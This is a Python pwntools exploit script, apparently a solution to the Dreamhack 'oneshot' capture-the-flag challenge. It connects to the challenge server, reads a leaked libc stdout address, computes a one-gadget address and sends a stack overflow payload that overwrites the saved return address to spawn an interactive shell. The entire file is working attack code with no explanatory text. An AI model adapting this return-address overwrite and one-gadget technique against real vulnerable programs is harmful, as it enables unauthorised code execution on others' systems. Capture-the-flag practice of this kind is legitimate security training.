from pwn import *

#p = process('./oneshot')
p = remote("host3.dreamhack.games", 13896)

e = ELF('./oneshot')
#libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc.so.6')

#stdout_offset = libc.symbols['stdout']
stdout_offset = 0x3c5620
#onegadget_offset = 0x4526a
#onegadget_offset = 0xf1147
#onegadget_offset = 0xf02a4
onegadget_offset = 0x45216

p.recvuntil(b'stdout: ')
stdout_addr = int(p.recvline()[:-1], 16)

print(hex(stdout_addr))
onegadget_addr = stdout_addr - stdout_offset + onegadget_offset

print(hex(onegadget_addr))
payload = b'A'*16
payload += b'B'*8 #for check
payload += b'\x00'*8 # for check
payload += b'B'*0x8 #sfp
payload += p64(onegadget_addr) # ret addr
payload += b'\x00'*0x50
p.sendlineafter(b"MSG: ", payload)

p.interactive()
